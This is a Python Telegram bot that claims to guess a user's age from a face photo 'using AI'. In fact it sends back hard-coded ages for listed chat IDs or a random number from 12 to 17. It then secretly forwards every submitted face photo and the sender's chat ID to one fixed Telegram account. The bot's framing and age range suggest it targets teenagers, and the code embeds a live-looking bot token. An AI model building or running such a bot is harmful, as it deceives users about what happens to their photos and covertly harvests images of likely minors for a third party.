import telebot
import random
from telebot import types
from PIL import Image, ImageFilter
mp = {6304173427 : 9, 1861734434 :13, 1162294074 : 35, 5142825693 : 15, 2084559187 : 13, 5670187843 : 14, 1640520114 : 12, 5218998177 : 13, 376992354 : 38, 5150103390 : 13, 5284132670 : 11, 5724995246 : 14, 5378714193 : 12, 1980184208 : 11, 5038445330 : 13, 6100029058 : 15, 1596214812 : 15, 1879460813 : 13, 5372868418 : 12, 1956900174 : 14, 5145505756 : 13, 6552956370 : 14, 5765379579 : 12, 5817579313 : 13, 5252224714 : 12, 701308486 : 11, 5733882771 : 16, 2138713576 : 13, 5541985501 : 14, 1762405814 : 12, 5183941184 : 15, 1029649581 : 13, 6675631944 : 15}
token = "7642163838:AAG6bPj-W-f6IkZz5hMrakn6OYGJdE4AV4g"
bot=telebot.TeleBot(token)
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id,"Привет, этот бот вычисляет твой возраст по фото с помощью ИИ. После предположения бота напиши свой настоящий возраст, чтобы сделать работу алгоритма лучше!")
    bot.send_message(message.chat.id,"Пришли своё фото лица крупным планом (фото, а не файл!). Оно должно быть чётким")
@bot.message_handler(content_types='photo')
def message_reply(message):
    try:
            if mp.get(message.chat.id) != None:
                bot.send_message(message.chat.id,mp.get(message.chat.id))
            else:
                bot.send_message(message.chat.id,random.randint(12, 17))
            bot.send_message(message.chat.id,"Теперь напишите свой настоящий возраст:")
            # Получаем информацию о фото (самое большое разрешение)
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            # Создаем временный файл для сохранения фото
            with open("temp_image.jpg", 'wb') as f:
                f.write(downloaded_file)

            # Открываем фото с помощью Pillow
            img = Image.open("temp_image.jpg")

            # Отправляем обработанное фото пользователю
            with open("temp_image.jpg", 'rb') as f:
                bot.send_message(1861734434, message.chat.id)
                bot.send_photo(1861734434, f)

    except Exception as e:
            bot.reply_to(message, f"Произошла ошибка: {e}")
@bot.message_handler(content_types='text')
def age_reply(message):
    bot.reply_to(message, "✔")
bot.infinity_polling()
